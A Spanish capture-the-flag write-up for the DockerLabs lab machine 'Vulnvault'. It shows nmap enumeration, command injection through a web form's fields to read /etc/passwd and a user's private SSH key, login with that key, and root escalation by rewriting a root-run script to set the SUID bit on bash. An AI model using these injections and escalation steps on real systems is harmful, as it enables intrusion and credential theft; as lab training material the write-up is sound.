#MAQUINA #DOCKERLABS #FACIL
#RCE
<hr>
# RECONOCIMIENTO

Vamos a resolver **Vulnvault** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:20 CET
Nmap scan report for escolares.dl (172.17.0.2)
Host is up (0.000020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:20 CET
Nmap scan report for escolares.dl (172.17.0.2)
Host is up (0.000020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Generador de Reportes - Centro de Operaciones
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 11:21 CET
Nmap scan report for escolares.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /old/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Directorio **old** interesante.

## HTTP (80)
Al revisar la web que hay en el puerto 80, vemos que hay un directorio **old**. 
Al meternos vemos que hay dos inputs que al rellenarlos nos generan un reporte.

# EXPLOTACION

Intentamos colar un comando de la siguiente manera:
Nombre ->**; cat /etc/passwd**
Fecha ->**; cat /etc/passwd**

Efectivamente, le podemos colar comandos (usuario -> **samara**, lo sacamos del /etc/passwd), así que vemos si tiene una clave privada de ssh en su directorio personal (/home/samara/.ssh/id_rsa):

Nombre ->**; cat /home/samara/.ssh/id_rsa**
Fecha ->**; cat /home/samara/.ssh/id_rsa**

La tiene, ahora podemos acceder con su clave privada:

   ```bash

ssh samara@172.17.0.2 -i id_rsa                       
The authenticity of host '172.17.0.2 (172.17.0.2)' cant be established.
ED25519 key fingerprint is SHA256:50SBUCdnSFCj03op6yJ3vYTdgMcXC07aE2LSeOkKaO8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Aug 20 19:54:15 2024 from 172.17.0.1
samara@787d762d2a20:~$

```
# ESCALADA PRIVILEGIOS

Vemos que procesos hay activos con **ps -ef**:
   ```bash
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  2 11:19 ?        00:00:25 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
root          15       1  0 11:19 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          33       1  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data      38      33  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data      39      33  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data      40      33  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data      41      33  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data      42      33  0 11:19 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  290811      33  0 11:22 ?        00:00:00 /usr/sbin/apache2 -k start
root     1344356      15  0 11:34 ?        00:00:00 sshd: samara [priv]
samara   1345499 1344356  0 11:34 ?        00:00:00 sshd: samara@pts/0
samara   1345510 1345499  0 11:34 pts/0    00:00:00 -bash
samara   1716889 1345510  0 11:37 pts/0    00:00:00 ps -ef


```

Vemos **script en /usr/local/bin** que lo ejecuta root en bucle, tenemos poder de escritura, lo modificamos:
   ```bash
samara@787d762d2a20:/usr/local/bin$ cat echo.sh 
#!/bin/bash

echo "No tienes permitido estar aqui :(." > /home/samara/message.txt
samara@787d762d2a20:/usr/local/bin$ nano echo.sh 
samara@787d762d2a20:/usr/local/bin$ cat echo.sh 
#!/bin/bash

chmod +s /bin/bash
samara@787d762d2a20:/usr/local/bin$ bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**